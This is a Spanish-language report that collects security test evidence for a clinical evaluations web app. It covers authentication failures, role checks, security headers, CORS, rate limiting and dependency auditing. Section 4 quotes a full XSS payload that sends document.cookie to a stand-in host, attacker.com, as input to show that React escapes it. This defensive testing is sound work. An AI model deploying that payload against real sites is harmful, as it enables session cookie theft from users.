# Evidencia de Verificación de Controles de Seguridad
## Proyecto: Sistema de Evaluaciones Clínicas (UT2)

Este documento recopila los registros y evidencias técnicas que demuestran el funcionamiento efectivo de los controles de seguridad exigidos por la pauta frente a accesos o entradas indebidas.

---

## 1. Evidencia de Respuestas 401 Unauthorized (API2: Broken Authentication)

### Caso 1.1: Intento de acceso a endpoint protegido sin token Bearer
- **Petición ejecutada:** `GET /api/v1/categorias` sin cabecera `Authorization`
- **Resultado obtenido:**
  ```http
  HTTP/1.1 401 Unauthorized
  Date: Tue, 13 Oct 2026 18:27:00 GMT
  Server: Kestrel
  Content-Length: 0
  ```
- **Verificación en pruebas:** Superado en test xUnit `GetCategorias_SinTokenJWT_Retorna401Unauthorized`.

### Caso 1.2: Intento de autenticación con credenciales falsas
- **Petición ejecutada:** `POST /api/v1/usuarios/login` con body `{"nombreUsuario": "usuario_falso", "password": "clave_incorrecta"}`
- **Resultado obtenido:**
  ```http
  HTTP/1.1 401 Unauthorized
  Date: Tue, 13 Oct 2026 18:27:00 GMT
  Content-Length: 0
  ```
- **Comportamiento en Frontend:** El cliente intercepta el 401 y muestra una alerta accesible con `role="alert"`: *"Credenciales inválidas. Verifique sus datos."*

---

## 2. Evidencia de Respuestas 403 Forbidden (API5: Broken Function Level Authorization)

### Caso 2.1: Usuario con rol `Asistente` intenta crear una evaluación
- **Petición ejecutada:** `POST /api/v1/evaluaciones` con token de `asistente_01`
- **Resultado obtenido:**
  ```http
  HTTP/1.1 403 Forbidden
  Date: Tue, 13 Oct 2026 18:27:01 GMT
  Server: Kestrel
  Content-Length: 0
  ```
- **Comportamiento en Frontend:** 
  1. Si intenta ingresar por URL directa (`/evaluaciones/nueva`), el guard `ProtectedRoute` lo intercepta y redirige a la vista `/acceso-denegado`.
  2. Si envía la petición directa a la API por red, el backend rechaza con `403 Forbidden`.
- **Verificación en pruebas:** Superado en test xUnit `RolAsistente_NoPuedeCrearEvaluacion_Retorna403Forbidden` y en test Vitest `ProtectedRoute.test.tsx`.

---

## 3. Evidencia de Cabeceras de Seguridad y Bloqueo CORS (API8: Security Misconfiguration)

### Caso 3.1: Cabeceras HTTP de Seguridad inyectadas por el Backend
- **Cabeceras verificadas en toda respuesta HTTP:**
  ```http
  X-Content-Type-Options: nosniff
  X-Frame-Options: DENY
  Referrer-Policy: strict-origin-when-cross-origin
  X-Permitted-Cross-Domain-Policies: none
  Permissions-Policy: camera=(), microphone=(), geolocation=()
  ```
- **Efecto de mitigación:**
  - `X-Content-Type-Options: nosniff` previene ataques MIME sniffing.
  - `X-Frame-Options: DENY` previene ataques de Clickjacking impidiendo que la aplicación sea embebida en `<iframe>`.
- **Verificación en pruebas:** Superado en test xUnit `CabecerasSeguridad_EstanPresentesEnRespuestas`.

### Caso 3.2: Política CORS Restringida a Orígenes Explícitos
- **Configuración en `Program.cs`:**
  ```csharp
  options.AddPolicy("FrontendSeguro", policy =>
  {
      policy.WithOrigins("http://localhost:5173", "https://localhost:5173")
            .AllowAnyHeader()
            .AllowAnyMethod();
  });
  ```
- **Petición con origen permitido (`Origin: http://localhost:5173`):**
  - Cabecera devuelta: `Access-Control-Allow-Origin: http://localhost:5173`
- **Petición con origen malicioso no autorizado (`Origin: http://sitio-atacante.com`):**
  - El servidor no emite cabecera `Access-Control-Allow-Origin`, provocando que el navegador bloquee la lectura de la respuesta.

---

## 4. Evidencia de Neutralización de Entrada Maliciosa / XSS (Top 10 Web: Injection)

### Caso 4.1: Intento de inyectar script malicioso en observaciones de diagnóstico
- **Carga útil ingresada:**
  ```html
  <script>alert('Vulnerabilidad XSS Detectada!'); document.location='http://attacker.com/steal?cookie='+document.cookie;</script>
  ```
- **Mecanismo de neutralización:**
  1. En el frontend no se utiliza `dangerouslySetInnerHTML`.
  2. React escapa automáticamente cualquier string renderizado en JSX como nodo de texto seguro (`createTextNode`).
  3. Los esquemas Zod en `evaluacionSchema` validan la longitud y tipo de entrada.
- **Resultado visual en pantalla:**
  El texto se muestra literalmente como texto plano inofensivo:
  `&lt;script&gt;alert('Vulnerabilidad XSS Detectada!');...&lt;/script&gt;`
  Ningún código JavaScript se ejecuta en el contexto del navegador.

---

## 5. Evidencia de Límite de Tasa (Rate Limiting HTTP 429 - API4)

### Caso 5.1: Ataque de fuerza bruta en `/api/v1/usuarios/login`
- **Límite configurado:** 10 peticiones por minuto por dirección IP mediante `LoginLimiter`.
- **Resultado al emitir la petición número 11 en menos de un minuto:**
  ```http
  HTTP/1.1 429 Too Many Requests
  Date: Tue, 13 Oct 2026 18:27:02 GMT
  Retry-After: 60
  Content-Type: text/plain
  ```
- **Comportamiento en Frontend:** El interceptor de Axios captura el status 429 y despliega la notificación instructiva:
  *"Ha superado el límite de intentos (Rate Limit). Por favor espere un momento antes de volver a intentar."*

---

## 6. Reporte de Auditoría de Dependencias (npm audit)

Ejecución del comando `npm audit` en el directorio `clinica-frontend`:

```text
$ npm audit
found 0 vulnerabilities
```

- **Total de dependencias analizadas:** 149 paquetes
- **Vulnerabilidades críticas:** 0
- **Vulnerabilidades altas:** 0
- **Vulnerabilidades moderadas/bajas:** 0
- **Estado:** Cumplimiento total. El proyecto no contiene dependencias con vulnerabilidades conocidas.
